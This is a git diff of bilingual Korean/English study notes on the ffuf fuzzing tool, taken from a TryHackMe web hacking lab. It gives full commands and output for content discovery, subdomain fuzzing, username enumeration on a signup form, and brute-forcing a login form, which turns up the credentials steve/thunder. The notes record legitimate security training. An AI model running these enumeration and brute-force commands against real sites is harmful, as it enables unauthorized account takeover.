@@ -1,5 +1,7 @@
 # ffuf
 
+https://github.com/ffuf/ffuf
+
 ## Automated Discovery 
 
 the process of using tools to discover content rather than doing it manually
@@ -7,9 +9,13 @@ the process of using tools to discover content rather than doing it manually
 ---
 
 
-## -w 
+### -w 
 switch to specify the wordlist we are going to use
-
+### -u 
+접속 대상 
+### FUZZ
+-w에 지정한 리스트의 내용이 한줄한줄 FUZZ 키워드와 교체되어서 실행됨   
+In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request
 ```
 root@ip-10-10-25-144:~# ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.211.134/FUZZ
 
@@ -72,14 +78,7 @@ x                       [Status: 200, Size: 2395, Words: 503, Lines: 52]
 ```
 root@ip-10-10-249-198:~# ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host:FUZZ.acmeitsupport.thm" -u http://10.10.75.9 -fs 2395
 
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
-
-       v1.3.1
+(ffuf 로고 생략)
 ________________________________________________
 
  :: Method           : GET
@@ -100,7 +99,98 @@ yellow                  [Status: 200, Size: 56, Words: 8, Lines: 1]
 ```
 
 
+## 실습 
+실습 회원가입 페이지에서 이미 사용중인 ID로 새로 가입을 하려고 하면 "An account with this username already exists"라는 문구가 뜨는 것을 이용 
+
+### -X 
+specifies the request method, this will be a GET request by default, but it is a POST request in our example. 
+
+### -d 
+specifies the data that we are going to send. In our example, we have the fields username, email, password and cpassword
+
+### -mr 
+text on the page we are looking for to validate we've found a valid username.
+```
+root@ip-10-10-242-38:~# head /usr/share/wordlists/SecLists/Usernames/Names/names.txt
+aaliyah
+aaren
+aarika
+aaron
+aartjan
+aarushi
+abagael
+```
+```
+root@ip-10-10-242-38:~# ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type:application/x-www-form-urlencoded" -u http://10.10.3.25/customers/signup -mr "username already exists"
+
+(ffuf 로고 생략)
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://10.10.3.25/customers/signup
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Usernames/Names/names.txt
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Data             : username=FUZZ&email=x&password=x&cpassword=x
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Regexp: username already exists
+________________________________________________
+
+admin                   [Status: 200, Size: 3720, Words: 992, Lines: 77]
+robert                  [Status: 200, Size: 3720, Words: 992, Lines: 77]
+simon                   [Status: 200, Size: 3720, Words: 992, Lines: 77]
+steve                   [Status: 200, Size: 3720, Words: 992, Lines: 77]
+:: Progress: [10164/10164] :: Job [1/1] :: 1462 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
+root@ip-10-10-242-38:~# 
+```
+## 실습 
+위에서 알아낸 이미 사용중인 ID목록과 자주쓰는 비밀번호 목록을 이용해서 아이디 비번 찾기 
+```
+root@ip-10-10-242-38:~# cat valid_usernames.txt 
+admin
+robert
+simon
+steve
+```
+```
+root@ip-10-10-242-38:~# head /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt 
+123456
+password
+12345678
+```
+```
+root@ip-10-10-242-38:~# ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.3.25/customers/login -fc 200
+
+(ffuf 로고 생략)
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://10.10.3.25/customers/login
+ :: Wordlist         : W1: valid_usernames.txt
+ :: Wordlist         : W2: /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Data             : username=W1&password=W2
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response status: 200
+________________________________________________
+
+[Status: 302, Size: 0, Words: 1, Lines: 1]
+    * W1: steve
+    * W2: thunder
+
+:: Progress: [400/400] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
+root@ip-10-10-242-38:~# 
+```
+
+
+---
 ---
 
-### References
+### Course
 [TryHackMe - Introduction to Web Hacking](https://tryhackme.com/module/intro-to-web-hacking)    
